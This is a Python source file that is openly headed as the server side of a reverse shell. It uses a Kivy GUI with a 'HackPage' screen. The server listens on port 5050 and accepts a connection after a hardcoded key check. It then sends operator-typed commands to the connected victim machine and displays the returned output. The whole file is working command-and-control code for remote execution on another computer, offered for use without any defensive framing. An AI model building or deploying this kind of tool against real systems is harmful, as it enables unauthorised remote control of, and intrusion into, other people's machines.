#-------------------------------------------#
#               REVERSE SHELL               #
#          SERVER SIDE CODE (R.LOKESH)      #
#-------------------------------------------#

#--------------INPORTING MODULES--------------#
import kivymd
from kivymd.app import MDApp
from kivymd.uix.textfield import MDTextField
from kivy.lang import Builder
from kivy.uix.screenmanager import ScreenManager
from kivy.uix.screenmanager import Screen
from kivymd.uix.button import MDRaisedButton
from kivy.core.window import Window
from kivy.properties import ObjectProperty
import socket
import threading
import subprocess
import sys
import os
#--------------INPORTING MODULES--------------#


#--------- CONSTANTS-------------#
host = socket.gethostname()
host_ip = socket.gethostbyname(host)
buffer_size = int(1024)
format = str('utf-8')
family = socket.AF_INET
Type = socket.SOCK_STREAM
port = int(5050)
connection = (host_ip, port)
Window.size = (500, 700)
global conn
#--------- CONSTANTS-------------#


s = socket.socket(family, Type, proto=0)
s.bind(connection)
s.listen(2)

#----------- KV FILE---------------#
kv = '''
ScreenManager:
    LoginScreen:
    HackPage:

<LoginScreen>:
    name : 'Login'
    ip : ip
    port : port
    key : key
    BoxLayout:
        orientation : 'vertical'
        padding : 60
        spacing : 80
        TextInput:
            id : ip
            multiline : False
            hint_text : 'TARGET IP ADDRESS'
            size_hint_x : None
            size_hint_y : None
            pos_hint : {'center_x':0.5,'center_y':0.8}
            width : 350
            height : 80
            font_size : 18

        TextInput:
            multiline : False
            id : port
            hint_text : 'TARGET PORT'
            size_hint_x : None
            size_hint_y : None
            pos_hint : {'center_x':0.5,'center_y':0.6}
            width : 350
            height : 80
            font_size : 18

        TextInput:
            multiline : False
            id : key
            hint_text : 'SECRET ACCESS KEY'
            size_hint_x : None
            size_hint_y : None
            pos_hint : {'center_x':0.5,'center_y':0.4}
            width : 350
            height : 80
            font_size : 18
        
        Button:
            text : 'CONNECT'
            size_hint_x : None
            size_hint_y : None
            pos_hint : {'center_x':0.5,'center_y':0.5}
            width : 280
            height : 60
            font_size : 18
            background_normal : ''
            background_color : (0, 1, 0.2, 0.4)
            on_press:
                root.connect()
            on_release :
                root.manager.current = 'hack'

<HackPage>:
    name : 'hack'
    out : out
    command : command
    BoxLayout:
        padding : 50
        spacing : 40
        orientation : 'vertical'
        GridLayout:
            cols : 2
            spacing : 15 
            TextInput:
                id : command
                hint_text : 'Enter your command here ...'
                size_hint_x : None
                size_hint_y : None
                pos_hint : {'center_x':0.5,'center_y':0.1}
                width : 300
                height : 50
                font_size : 18
            
            Button:
                text : 'SEND'
                size_hint_x : None
                size_hint_y : None
                pos_hint : {'center_x':0.5,'center_y':0.5}
                width : 70
                height : 50
                font_size : 18
                background_normal : ''
                background_color : (0, 1, 0.2, 0.4)
                on_press:
                    root.send()

        TextInput:
            id : out
            multiline : True
            hint_text : 'Output ...'
            size_hint_x : None
            size_hint_y : None
            pos_hint : {'center_x':0.5,'center_y':0.1}
            width : 390
            height : 460
            font_size : 18

'''
#----------- KV FILE---------------#


class LoginScreen(Screen):
    ip = ObjectProperty(None)
    port = ObjectProperty(None)
    key = ObjectProperty(None)

    def connect(self):
        global conn
        if str(self.key.text) == '27845':
            print('Stating...')
            conn, addr = s.accept()
            print('Started')
    


class HackPage(Screen):
    command = ObjectProperty(None)
    out = ObjectProperty(None)
    command = ObjectProperty(None)

    def send(self):
        cmd = self.command.text
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()

        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(buffer_size), format)
            print(client_response, end='')
            self.out.text = client_response


class App(MDApp):
    s = ScreenManager()
    s.add_widget(LoginScreen(name='Login'))
    s.add_widget(HackPage(name='hack'))

    def build(self):
        self.theme_cls.theme_style = 'Dark'
        return Builder.load_string(kv)


if __name__ == "__main__":
    App().run()

#---------------END-------------------#